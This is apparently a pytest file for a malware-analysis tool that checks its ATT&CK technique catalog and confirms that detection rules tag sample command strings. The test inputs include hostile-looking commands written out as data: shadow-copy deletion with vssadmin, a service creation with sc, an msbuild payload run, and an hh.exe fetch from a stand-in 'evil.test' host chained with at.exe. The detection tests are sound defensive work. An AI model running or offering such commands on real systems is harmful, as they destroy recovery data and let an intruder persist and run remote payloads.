"""Bundled ATT&CK catalog integrity and rule/catalog sync.

The catalog is the allow-list for every technique Titan can report: behavior
rules, LOLBin rules, and detection `attack_ids` all resolve against it. These
tests keep the catalog well-formed and guarantee no producer references a
technique the catalog does not carry (which would be silently dropped).
"""

import re

from titan_decoder.threat_intel import ThreatIntelligenceEngine
from titan_decoder.threat_intel.catalog import load_attack_catalog
from titan_decoder.threat_intel.lolbins import DEFAULT_LOLBIN_RULES

_ID_PATTERN = re.compile(r"^T\d{4}(?:\.\d{3})?$")


def test_catalog_ids_unique_and_well_formed():
    techniques = load_attack_catalog()["techniques"]
    ids = [item["id"] for item in techniques]
    assert len(ids) == len(set(ids)), "duplicate technique IDs in catalog"
    for item in techniques:
        assert _ID_PATTERN.match(item["id"]), f"malformed ID: {item['id']}"
        assert item["name"], f"{item['id']} has no name"
        assert item["tactics"], f"{item['id']} has no tactics"
        for tactic in item["tactics"]:
            assert tactic == tactic.lower(), f"{item['id']}: tactic not lowercase"


def test_subtechniques_have_parent_or_standalone_form():
    """Every sub-technique ID must itself be well-formed against the base."""
    by_id = load_attack_catalog()["by_id"]
    for technique_id in by_id:
        if "." in technique_id:
            base = technique_id.split(".")[0]
            assert _ID_PATTERN.match(base)


def test_behavior_rule_techniques_exist_in_catalog():
    by_id = load_attack_catalog()["by_id"]
    for technique_id, _pattern, rule_name in ThreatIntelligenceEngine.BEHAVIOR_RULES:
        assert technique_id in by_id, (
            f"behavior rule '{rule_name}' references {technique_id}, missing "
            "from attack_catalog.json"
        )


def test_lolbin_rule_techniques_exist_in_catalog():
    by_id = load_attack_catalog()["by_id"]
    for rule in DEFAULT_LOLBIN_RULES:
        for technique_id in rule.technique_ids:
            assert technique_id in by_id, (
                f"LOLBin rule '{rule.name}' references {technique_id}, "
                "missing from attack_catalog.json"
            )


def _techniques_for(preview: str) -> set:
    report = {"nodes": [{"id": 0, "content_preview": preview}]}
    result = ThreatIntelligenceEngine().analyze(report)
    return {item["technique_id"] for item in result["techniques"]}


def test_shadow_copy_deletion_maps_inhibit_recovery():
    ids = _techniques_for("cmd /c vssadmin delete shadows /all /quiet")
    assert "T1490" in ids
    assert "T1486" not in ids  # encryption is not evidenced by shadow deletion


def test_double_extension_maps_masquerading():
    assert "T1036" in _techniques_for("open invoice.pdf.exe to view the document")


def test_service_creation_maps_windows_service():
    assert "T1543.003" in _techniques_for('sc create updater binPath= "c:\\u.exe"')


def test_msbuild_lolbin_detected():
    report = {
        "nodes": [{"id": 0, "content_preview": "msbuild.exe payload.csproj /p:Cfg=1"}]
    }
    result = ThreatIntelligenceEngine().analyze(report)
    lolbins = {item["executable"] for item in result["lolbins"]}
    assert "msbuild.exe" in lolbins
    assert "T1127.001" in {t["technique_id"] for t in result["techniques"]}


def test_hh_and_at_require_exe_suffix():
    benign = _techniques_for(
        "The meeting runs 09:00-10:30 (hh:mm). Please look at the agenda."
    )
    assert "T1218.001" not in benign
    assert "T1053.002" not in benign

    fired = _techniques_for("hh.exe http://evil.test/a.chm && at.exe 12:00 payload")
    assert "T1218.001" in fired
    assert "T1053.002" in fired


def test_benign_prose_produces_no_techniques():
    assert _techniques_for(
        "The quarterly budget report is attached for review. Totals were "
        "confirmed by the finance team during the planning meeting."
    ) == set()
